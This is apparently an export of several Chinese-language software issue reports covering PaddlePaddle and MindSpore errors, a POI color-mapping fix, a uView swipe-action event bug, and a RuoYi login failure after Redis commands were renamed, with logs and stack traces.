epoch: 6 step: 100, loss is 976.2853 epoch: 6 step: 110, loss is 985.6064 epoch: 6 step: 120, loss is 995.10864 epoch: 6 step: 130, loss is 952.8546 epoch: 6 step: 140, loss is 1079.5222 epoch: 6 step: 150, loss is 1102.2661 epoch: 6 step: 160, loss is 1020.70105 epoch: 6 step: 170, loss is 1104.5074 epoch: 6 step: 180, loss is 911.04346 epoch: 6 step: 190, loss is 929.61536 epoch: 6 step: 200, loss is 971.39154 epoch: 6 step: 210, loss is 843.0594 epoch: 6 step: 220, loss is 962.547 epoch: 6 step: 230, loss is 958.0032 epoch: 6 step: 240, loss is 857.30786 epoch: 6 step: 250, loss is 937.04956 epoch: 6 step: 260, loss is 914.91455 epoch: 6 step: 270, loss is 942.2667 epoch: 6 step: 280, loss is 992.8222 epoch: 6 step: 290, loss is 883.32666 epoch: 6 step: 300, loss is 1057.0215 epoch: 6 step: 310, loss is 949.4363 epoch: 7 step: 8, loss is 1057.1163 epoch: 7 step: 18, loss is 1112.1943 epoch: 7 step: 28, loss is 863.4289 epoch: 7 step: 38, loss is 1028.0049 epoch: 7 step: 48, loss is 1057.8445 epoch: 7 step: 58, loss is 1074.8401 epoch: 7 step: 68, loss is 1142.6154 epoch: 7 step: 78, loss is 937.6549 epoch: 7 step: 88, loss is 1110.4645 epoch: 7 step: 98, loss is 843.034 epoch: 7 step: 108, loss is 1141.99 epoch: 7 step: 118, loss is 996.8211 epoch: 7 step: 128, loss is 1084.9275 epoch: 7 step: 138, loss is 996.56866 epoch: 7 step: 148, loss is 1024.1538 epoch: 7 step: 158, loss is 970.95776 epoch: 7 step: 168, loss is 1046.1344 epoch: 7 step: 178, loss is 916.8433 epoch: 7 step: 188, loss is 1003.2721 epoch: 7 step: 198, loss is 1055.4509 epoch: 7 step: 208, loss is 942.33887 epoch: 7 step: 218, loss is 968.1915 epoch: 7 step: 228, loss is 883.3617 epoch: 7 step: 238, loss is 902.89844 epoch: 7 step: 248, loss is 1028.2458 epoch: 7 step: 258, loss is 1170.6587 epoch: 7 step: 268, loss is 968.11096 epoch: 7 step: 278, loss is 911.09045 epoch: 7 step: 288, loss is 943.306 epoch: 7 step: 298, loss is 985.5856 epoch: 7 step: 308, loss is 903.8626 epoch: 8 step: 6, loss is 950.9064 epoch: 8 step: 16, loss is 903.12695 epoch: 8 step: 26, loss is 942.2672 epoch: 8 step: 36, loss is 996.4901 epoch: 8 step: 46, loss is 959.5333 epoch: 8 step: 56, loss is 903.96155 epoch: 8 step: 66, loss is 880.0815 epoch: 8 step: 76, loss is 974.563 epoch: 8 step: 86, loss is 1145.5955 epoch: 8 step: 96, loss is 920.0111 epoch: 8 step: 106, loss is 1057.0067 epoch: 8 step: 116, loss is 830.4983 epoch: 8 step: 126, loss is 982.05084 epoch: 8 step: 136, loss is 980.97943 epoch: 8 step: 146, loss is 863.446 epoch: 8 step: 156, loss is 941.381 epoch: 8 step: 166, loss is 1029.4707 epoch: 8 step: 176, loss is 1028.0681 epoch: 8 step: 186, loss is 1091.7048 epoch: 8 step: 196, loss is 927.3729 epoch: 8 step: 206, loss is 962.53357 epoch: 8 step: 216, loss is 1006.6542 epoch: 8 step: 226, loss is 936.0728 epoch: 8 step: 236, loss is 843.70734 epoch: 8 step: 246, loss is 942.8391 epoch: 8 step: 256, loss is 1010.02344 epoch: 8 step: 266, loss is 922.30505 epoch: 8 step: 276, loss is 1051.7675 epoch: 8 step: 286, loss is 973.2671 epoch: 8 step: 296, loss is 981.76575 epoch: 8 step: 306, loss is 935.9751 epoch: 9 step: 4, loss is 1058.8389 epoch: 9 step: 14, loss is 994.5307 epoch: 9 step: 24, loss is 925.42554 epoch: 9 step: 34, loss is 1064.3945 epoch: 9 step: 44, loss is 936.05585 epoch: 9 step: 54, loss is 1062.4822 epoch: 9 step: 64, loss is 1132.9341 epoch: 9 step: 74, loss is 995.0226 epoch: 9 step: 84, loss is 984.433 epoch: 9 step: 94, loss is 1020.8118 epoch: 9 step: 104, loss is 1010.4917 epoch: 9 step: 114, loss is 857.6094 epoch: 9 step: 124, loss is 1036.1825 epoch: 9 step: 134, loss is 937.58887 epoch: 9 step: 144, loss is 982.9225 epoch: 9 step: 154, loss is 1135.1138 epoch: 9 step: 164, loss is 936.037 epoch: 9 step: 174, loss is 991.7706 epoch: 9 step: 184, loss is 985.4818 epoch: 9 step: 194, loss is 982.2411 epoch: 9 step: 204, loss is 937.6166 epoch: 9 step: 214, loss is 1021.95416 epoch: 9 step: 224, loss is 1081.8428 epoch: 9 step: 234, loss is 964.8825 epoch: 9 step: 244, loss is 1028.249 epoch: 9 step: 254, loss is 908.879 epoch: 9 step: 264, loss is 916.62915 epoch: 9 step: 274, loss is 969.6216 epoch: 9 step: 284, loss is 962.03253 epoch: 9 step: 294, loss is 954.32434 epoch: 9 step: 304, loss is 1022.4805 epoch: 10 step: 2, loss is 991.489 epoch: 10 step: 12, loss is 1063.2219 epoch: 10 step: 22, loss is 1058.877 epoch: 10 step: 32, loss is 914.8042 epoch: 10 step: 42, loss is 1062.7356 epoch: 10 step: 52, loss is 982.2907 epoch: 10 step: 62, loss is 996.7837 epoch: 10 step: 72, loss is 972.01294 epoch: 10 step: 82, loss is 1046.2128 epoch: 10 step: 92, loss is 1142.605 epoch: 10 step: 102, loss is 923.3635 epoch: 10 step: 112, loss is 1006.68024 epoch: 10 step: 122, loss is 982.07434 epoch: 10 step: 132, loss is 974.34143 epoch: 10 step: 142, loss is 1009.1692 epoch: 10 step: 152, loss is 917.1685 epoch: 10 step: 162, loss is 1067.8656 epoch: 10 step: 172, loss is 949.6892 epoch: 10 step: 182, loss is 1047.5399 epoch: 10 step: 192, loss is 916.4011 epoch: 10 step: 202, loss is 1018.0974 epoch: 10 step: 212, loss is 1102.5142 epoch: 10 step: 222, loss is 877.18207 epoch: 10 step: 232, loss is 884.04315 epoch: 10 step: 242, loss is 943.5912 epoch: 10 step: 252, loss is 985.31604 epoch: 10 step: 262, loss is 1081.5641 epoch: 10 step: 272, loss is 917.3744 epoch: 10 step: 282, loss is 969.23364 epoch: 10 step: 292, loss is 909.3941 epoch: 10 step: 302, loss is 914.8828 epoch: 10 step: 312, loss is 935.9314 epoch: 11 step: 10, loss is 976.1701 epoch: 11 step: 20, loss is 857.2692 epoch: 11 step: 30, loss is 984.4112 epoch: 11 step: 40, loss is 942.82935 epoch: 11 step: 50, loss is 919.0366 epoch: 11 step: 60, loss is 923.7053 ..."
fluid分布式gpu版本出现异常cudaGetDeviceCount failed in paddle::platform::GetCUDADeviceCount: unknown error at [/paddle/paddle/fluid/platform/gpu_info.cc:32],"使用了1卡的情况下（共8卡，有两卡正在被其他进程使用），出现下面的异常   <code>: Traceback (most recent call last): File ""trainer.py"", line 287, in &lt;module&gt; train_main(use_cuda=True, is_sparse=True) File ""trainer.py"", line 280, in train_main exe.run(pserver_startup) File ""/usr/local/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 292, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: cudaGetDeviceCount failed in paddle::platform::GetCUDADeviceCount: unknown error at [/paddle/paddle/fluid/platform/gpu_info.cc:32] PaddlePaddle Call Stacks: 0 0x7f2a2bd12c56p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486 1 0x7f2a2c928016p paddle::platform::GetCUDADeviceCount() + 246 2 0x7f2a2c92889fp paddle::platform::SetDeviceId(int) + 31 3 0x7f2a2c80a8a4p paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 116 4 0x7f2a2bd9a32ep paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) + 1214 5 0x7f2a2bd27adbp _ZZN8pybind1112cpp_function10initializeIZNS0_C1IvN6paddle9framework8ExecutorEIRKNS4_11ProgramDescEPNS4_5ScopeEibbEINS_4nameENS_9is_methodENS_7siblingEEEEMT0_FT_DpT1_EDpRKT2_EUlPS5_S8_SA_ibbE_vISO_S8_SA_ibbEISB_SC_SD_EEEvOSF_PFSE_SH_ESN_ENUlRNS_6detail13function_callEE1_4_FUNESV_ + 555 6 0x7f2a2bd21864p pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 2596 7 0x7f2a7fa42631p PyEval_EvalFrameEx + 24497 8 0x7f2a7fa43bcep PyEval_EvalCodeEx + 2190 9 0x7f2a7fa4220ap PyEval_EvalFrameEx + 23434 10 0x7f2a7fa43bcep PyEval_EvalCodeEx + 2190 11 0x7f2a7fa4220ap PyEval_EvalFrameEx + 23434 12 0x7f2a7fa43bcep PyEval_EvalCodeEx + 2190 13 0x7f2a7fa43ce2p PyEval_EvalCode + 50 14 0x7f2a7fa639e0p PyRun_FileExFlags + 176 15 0x7f2a7fa63bbfp PyRun_SimpleFileExFlags + 239 16 0x7f2a7fa79454p Py_Main + 3188 17 0x7f2a7ed2dcddp __libc_start_main + 253 18 0x400649p"
建议更改PoiCssUtils.java中已废弃的变量,"更改为：   <code>: static { for (Map.Entry&lt;Integer, HSSFColor&gt; color : HSSFColor.getIndexHash().entrySet()) { colors.put(colorName(color.getValue().getClass()), color.getValue()); } // light gray HSSFColor color = HSSFColorPredefined.GREY_25_PERCENT.getColor(); colors.put(""lightgray"", color); colors.put(""lightgrey"", color); // silver colors.put(""silver"", HSSFColorPredefined.GREY_40_PERCENT.getColor()); // darkgray color = HSSFColorPredefined.GREY_50_PERCENT.getColor(); colors.put(""darkgray"", color); colors.put(""darkgrey"", color); // gray color = HSSFColorPredefined.GREY_80_PERCENT.getColor(); colors.put(""gray"", color); colors.put(""grey"", color); }"
【众智】【计算-GPU开发】LuUnpack,LuUnpack 从张量的LU分解中解压缩数据和透视。 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py LU_data LU_pivots unpack_data bool 属性 unpack_pivots bool 属性 pivots L U 对应底层算子 对应底层算子 Classify Name Type Type Range Required Doc Default INPUT LU_data int8/uint8/int16/int32/int64/float16/float32/float64 TRUE INPUT LU_pivots int8/uint8/int16/int32/int64 TRUE ATTR unpack_data bool FALSE TRUE ATTR unpack_pivots bool FALSE TRUE OUTPUT pivots int8/uint8/int16/int32/int64/float16/float32/float64 TRUE OUTPUT L int8/uint8/int16/int32/int64/float16/float32/float64 TRUE OUTPUT U int8/uint8/int16/int32/int64/float16/float32/float64 TRUE PyTorch1.8.1接口： torch.lu_unpack https://pytorch.org/docs/1.8.1/generated/torch.lu_unpack.html 3. 异常处理 4. 算子反向 通过LuUnpackGrad求反向   <code>: class LuUnpack(Primitive):
关于u-swipe-action组件开启关闭事件触发建议,"当使用左右滑去触发组件展开收缩时，能够正确触发open和close事件，当时当展开组件时，使用点击内容，虽然组件样式会收缩起来，但是触发的事件却是open，并且没有触发close事件 触发close事件 看源码点击时的处理是 希望建议能改成，这样能够正确触发close事件了 取消触发open事件   <code>: // 点击内容触发事件 contentClick() { // 点击内容时，如果当前为打开状态，收起组件 if (this.status === true) { this.status = 'close'; this.moveX = 0; } this.$emit('content-click', this.index); } // 点击内容触发事件 contentClick() { // 点击内容时，如果当前为打开状态，收起组件 if (this.status === true) { //this.status = 'close'; //this.moveX = 0; this.moveX = 0; this.status = false; this.emitCloseEvent(); } this.$emit('content-click', this.index); } // 用户手指离开movable-view元素，停止触摸 touchend() { ... if (this.status == false) { ... }else{ if (this.scrollX &gt; (-this.allBtnWidth * 3) / 4) { this.moveX = 0; this.$nextTick(() =&gt; { this.moveX = 101; }); this.status = false; this.emitCloseEvent(); } else { this.moveX = -this.allBtnWidth; // 建议取消此处这两行代码，首先本是status=true才会进入此处所以再次赋值true没必要，其次进入此处是本已经展开状态的了，无需再次emit一次open请求，也能解决通过点击的方式收缩组件却触发了open事件 // this.status = true; // this.emitOpenEvent(); } } ... }"
Executor interface design and implementation,"Fix #4523:Changing SGD inputs and outputs to conform to Operator naming convention #4557:more TensorArray background is needed in design Timeline(@tonyyang-svail): Oct 3rd, Tuesday Implement . It Takes a and Creates a local scope Runs the whole graph fetches desired value possible test: Init, add, then fetch Oct 4th, Wednesday Write FeedOp and FetchOp design Doc and get general feedback on it. Oct 5th, Thursday Reach a basic conclusion on FeedOp and FetchOp. Implement (by @QiJune ) Note: Prepend to , so that it will be ran first. Implement (by @QiJune ) Implement first version of . It Takes (Use to find , and use to find . Returns a indicates a op should be run or no. Oct 6th, Friday Make GPU unit test work (by @QiJune ) Test Simple Graph on Oct 7th, Saturday Refactor FeedOp and FetchOp Random number generator Independent of the Graph Draft executor design doc, which contains Necessity of pruning. GAN Example Simplify c++ OpDesc create procedure Oct 8th, Sunday Test Complicated Graph on <del>Add Backward ProtoBuf</del>. (<del>Several bugs found on backward #4627:Unify CUDA stream in Tensor CopyFrom interface</del>. Fixed) Keep consistent with . Switch to . Oct 9th, Monday Merge FeedOp and FetchOp design doc #4599:Fix OpDesc bug <del>Integrate InitOp into </del>. (More discussion needed for where to put init op) Milestone: pass a simple test on forward and backward multiple times.   <code>: vector&lt;Tensor&gt; Executor.Run) ProgramDesc Scope FeedOp FeedOp ProgramDesc FetchOp Prune const ProgramDesc&amp; input FeedOp feed FetchOp target vector&lt;bool&gt; Prune executor_test.cc Run() Preprocessing() Prune AppendBackward ProgramDescBind ProgramDesc"
"[CT][MS][OCCM][listdiff]算子在 GPU上出现报错，报错显示ValueError: operands could not be broadcast together with shapes (81,) (33,)","算子在gpu上出现 ValueError: operands could not be broadcast together with shapes (81,) (33,) 运行用例 ** def test_p_listdiff_float16_1m(): np.random.seed(1024) x = Tensor(np.random.uniform(-100, 100, [1024 * 1024]), mstype.float16) y = Tensor(np.random.uniform(-100, 100, [1024 * 128]), mstype.float16) fact = ListDiffMock(inputs=[x, y]) test_listdiff.py:42: ../share/ops/primitive/listdiff_ops.py:80: in forward_cmp allclose_nparray(out_tf, out_mindspore, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray elif not np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan): &lt;array_function internals&gt;:6: in allclose ??? /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/numpy/core/numeric.py:2189: in allclos res = all(isclose(a, b, rtol=rtol, atol=atol, equal_nan=equal_nan)) &lt;array_function internals&gt;:6: in isclose ??? /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/numpy/core/numeric.py:2290: in isclose return within_tol(x, y, atol, rtol) x = array([-0.8604, -6.977 , -1.568 , ..., 1.128 , -1.926 , -7.027 ], dtype=float16) y = array([0., 0., 0., ..., 0., 0., 0.], dtype=float16), atol = 0.001, rtol = 0.001 E ValueError: operands could not be broadcast together with shapes (23148,) (1048576,) /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/numpy/core/numeric.py:2276: ValueError** / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_listdiff.py::test_p_listdiff_float16_1m test_listdiff.py::test_p_listdiff_float32_1k test_listdiff.py::test_p_listdiff_float32_1m test_listdiff.py::test_p_listdiff_float64_1k test_listdiff.py::test_p_listdiff_float64_1m test_listdiff.py::test_p_listdiff_uint8 test_listdiff.py::test_p_listdiff_int8 test_listdiff.py::test_p_listdiff_uint16_1k test_listdiff.py::test_p_listdiff_uint16_10k test_listdiff.py::test_p_listdiff_int16_1k test_listdiff.py::test_p_listdiff_int16_10k test_listdiff.py::test_p_listdiff_int32_1k test_listdiff.py::test_p_listdiff_int32_1m test_listdiff.py::test_p_listdiff_int64_1k test_listdiff.py::test_p_listdiff_int64_1m test_listdiff.py::test_p_listdiff_wrong_input_dtype test_listdiff.py::test_p_listdiff_input_dtype_not_same test_listdiff.py::test_p_listdiff_wrong_input_dtype_not_tensor test_listdiff.py::test_p_listdiff_wrong_input_shape test_listdiff.py::test_p_listdiff_wrong_attr_type test_listdiff.py::test_dynamic_shape_listdiff_dy1 test_listdiff.py::test_dynamic_shape_listdiff_dy2 test_listdiff.py::test_dynamic_shape_listdiff_dy3   <code>: fact.forward_cmp() def within_tol(x, y, atol, rtol): with errstate(invalid='ignore'): return less_equal(abs(x-y), atol + rtol * abs(y))"
redis命令修改后报错,"因为安全需求，redis的常用命令被要求重命名，修改后auth模块启动后报错RedisCommandExecutionException:ERR unknown command '（原默认命令）'导致无法执行登录等操作，请问有什么解决办法？详细报错举例如下: 2021-12-22 19:30:05.441 WARN 1533267 --- [nio-9200-exec-4] c.r.a.e.CustomOauthExceptionSerializer : oauth2 认证异常 {} com.ruoyi.auth.exception.CustomOauthException: Pipeline contained one or more invalid commands; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at com.ruoyi.auth.exception.CustomWebResponseExceptionTranslator.translate(CustomWebResponseExceptionTranslator.java:18) ~[classes!/:na] at org.springframework.security.oauth2.provider.endpoint.TokenEndpoint.handleException(TokenEndpoint.java:171) ~[spring-security-oauth2-2.3.4.RELEASE.jar!/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_311] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_311] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_311] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_311] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) ~[spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:403) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:61) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:141) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.handler.HandlerExceptionResolverComposite.resolveException(HandlerExceptionResolverComposite.java:80) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1300) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1111) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) [tomcat-embed-core-9.0.41.jar!/:4.0.FR] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) [tomcat-embed-core-9.0.41.jar!/:4.0.FR] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) [tomcat-embed-websocket-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:126) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilterInternal(BasicAuthenticationFilter.java:155) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.oauth2.provider.client.ClientCredentialsTokenEndpointFilter.successfulAuthentication(ClientCredentialsTokenEndpointFilter.java:131) [spring-security-oauth2-2.3.4.RELEASE.jar!/:na] at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:240) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:92) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:77) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) [spring-security-web-5.2.8.RELEASE.jar!/:5.2.8.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) [spring-boot-actuator-2.2.12.RELEASE.jar!/:2.2.12.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-9.0.41.jar!/:9.0.41] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.12.RELEASE.jar!/:5.2.12.RELEASE] at 